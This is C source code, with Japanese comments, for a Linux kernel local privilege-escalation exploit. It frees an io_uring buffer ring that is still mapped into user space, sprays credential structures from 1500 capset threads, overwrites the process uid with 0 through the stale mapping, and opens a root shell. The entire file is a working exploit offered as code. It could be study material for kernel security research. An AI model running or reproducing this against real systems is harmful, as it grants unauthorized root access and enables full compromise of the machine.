#define _GNU_SOURCE

#include <unistd.h>
#include <err.h>
#include <string.h>
#include <stdio.h>
#include <ctype.h>
#include <liburing.h>
#include <stdlib.h>
#include <sys/capability.h>
#include <sys/syscall.h>
#include <sys/mman.h>
#include <sys/wait.h>
#include <pthread.h>

#define THREAD_NUM 1500

struct state {
    // cred spray の準備が整ったか
    bool is_ready_for_spray;
    // 権限昇格に成功したスレッドがあるか
    bool exist_root;
    // setcap() を実行したスレッド数
    int setcap_num;
};
struct state state = { false, false, 0 };

pthread_mutex_t lock = PTHREAD_MUTEX_INITIALIZER;

void errExit(const char *msg1) {
    puts(msg1);
    exit(-1);
}

pid_t gettid(void) {
    return syscall(SYS_gettid);
}

void *setcap_worker(void *param) {
    struct __user_cap_header_struct cap_header = {
      .version = _LINUX_CAPABILITY_VERSION_3,
      .pid = gettid(),
    };
    struct __user_cap_data_struct cap_data[2] = {
        {.effective = 0, .inheritable = 0, .permitted = 0},
        {.effective = 0, .inheritable = 0, .permitted = 0}
    };

    while (!state.is_ready_for_spray) {
        usleep(1000);
    }

    if (syscall(SYS_capset, &cap_header, (void *)cap_data)) errExit("[-] capset() failed");
    pthread_mutex_lock(&lock);
    state.setcap_num++;
    pthread_mutex_unlock(&lock);

    while (1) {
        pthread_mutex_lock(&lock);
        // 既に権限昇格したスレッドがある場合は終了
        if (state.exist_root) {
            pthread_mutex_unlock(&lock);
            return NULL;
        }

        // UIDが書き変わっているか確認
        if ((getuid() == 0 || geteuid() == 0)) {
            state.exist_root = true;
            // ロックを解除して，ループを抜ける
            pthread_mutex_unlock(&lock);
            break;
        }
        pthread_mutex_unlock(&lock);
        usleep(1000);
    }
    puts("[+] Now, I am root!");
    system("/bin/sh");
    return NULL;
}

void pinning_cpu(int core) {
  cpu_set_t mask;

  CPU_ZERO(&mask);
  CPU_SET(core, &mask);

  if (sched_setaffinity(getpid(), sizeof(mask), &mask) < 0) {
    errExit("[-] pinning_thread failed");
  }
}

int main() {
    int i; // for loop
    pinning_cpu(0);

    pthread_t thread[THREAD_NUM];
    puts("[+] creating threads...");
    for (i = 0; i < THREAD_NUM; i++) {
        int ret = pthread_create(&thread[i], NULL, setcap_worker, NULL);
        if (ret) errExit("[-] failed to create thread\n");
    }

    sleep(1);
    
    // io_uring の初期化
    puts("[+] init io_uring");
    struct io_uring ring;
    io_uring_queue_init(40, &ring, 0);

    // register buffer ring
    struct io_uring_buf_reg reg = {
        .ring_entries = 1,
        .bgid = 0,
        .flags = IOU_PBUF_RING_MMAP
    };
    io_uring_register_buf_ring(&ring, &reg, 0);

    // ユーザ空間にマップ
    void *pbuf_map = mmap(NULL, 0x1000, PROT_READ|PROT_WRITE, MAP_SHARED, ring.ring_fd, IORING_OFF_PBUF_RING);
    if (pbuf_map == MAP_FAILED) {
        errExit("[-] mmap() failed");
    }
    puts("[+] map ring buffer to user space");

    // 他のプロセスに CPU を譲る
    for (i = 0; i < 10; i++) {
        sched_yield();
    }

    // ring 解放
    puts("[+] release ring buffer");
    io_uring_unregister_buf_ring(&ring, reg.bgid);
    state.is_ready_for_spray = true;

    // cred spray を待つ
    puts("[+] waiting for cred spray...");
    while (state.setcap_num < THREAD_NUM) {
        usleep(1000);
    }
    
    // Use-After-Free
    puts("[+] checking if uid is in place");
    uid_t user_id = getuid();
    for (i = 0; i < 0x1000 / sizeof(uint16_t); i++) {
        uint16_t *value = (uint16_t *)pbuf_map + i;
        if (*value == user_id) {
            *value = 0;
            puts("[+] rewrite uid");
            break;
        }
    }

    sleep(900);

    io_uring_queue_exit(&ring);

    return 0;
}
